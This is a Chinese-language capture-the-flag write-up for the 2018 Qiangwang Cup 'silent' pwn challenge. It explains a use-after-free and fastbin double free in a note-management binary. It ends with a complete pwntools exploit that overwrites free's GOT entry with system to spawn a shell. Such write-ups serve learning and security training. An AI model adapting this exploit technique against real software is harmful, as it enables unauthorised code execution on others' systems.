# 2018强网杯--pwn-silent

checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

nx 栈溢出检测，估计是堆溢出

ida打开

```
switch ( v3 )
    {
      case 2:
        freenote();
        break;
      case 3:
        update();
        break;
      case 1:
        add();
        break;
    }
```

free函数有漏洞

```c
signed __int64 sub_400A99()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  __isoc99_scanf("%d", &v1);
  getchar();
  if ( v1 < 0 || v1 > 9 )
    return 0xFFFFFFFFLL;
  free(s[v1]);
  return 0LL;
}
```

可以看到指针free后并没有置null 还有.bss段里的指针值也没清0，并且update时没有检测指针是否free

所以uaf 和 fastbin 的double free 都是可以用的

函数中还有system 函数

```
.plt:0000000000400730 ; int system(const char *command)
.plt:0000000000400730 _system         proc near               ; CODE XREF: sub_4009A4+1C↓p
.plt:0000000000400730                 jmp     cs:off_602030
.plt:0000000000400730 _system         endp
```

## 利用思路：

利用uaf修改free的got表为system的地址

```
x/30gx 0x602000-0x6
0x601ffa:	0x1e28000000000000	0x4168000000000060
0x60200a:	0x47c000007f01141f	0x070600007f0113fe
0x60201a:	0x0716000000000040	0x0726000000000040
0x60202a:	0xd510000000000040	0x805000007f0113c6

```

```
readelf -a ./silent |grep "free"
000000602018  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND free@GLIBC_2.2.5 (2)
```

exp:

```
from pwn import *

r = process("./silent")
print util.proc.pidof(r)
pause()

def add(size, content):
	r.sendline("1")
	r.sendline(str(size))
	r.sendline(content)
	r.sendline()

def free(index):
	r.sendline("2")
	r.sendline(str(index))

def update(index,content):
	r.sendline("3")
	r.sendline(str(index))
	r.sendline(content)

system_plt = 0x400730
addr = 0x602000 - 0x6

add(0x50,'a'*48)
add(0x50,'b'*50)
add(0x50,'/bin/sh')
free(0)
free(1)
free(0)
update(0,p64(addr))
add(0x50,'3'*0x5f)
add(0x50,('\x41'*(6+8))+p64(system_plt))
free(2)
r.interactive()
```
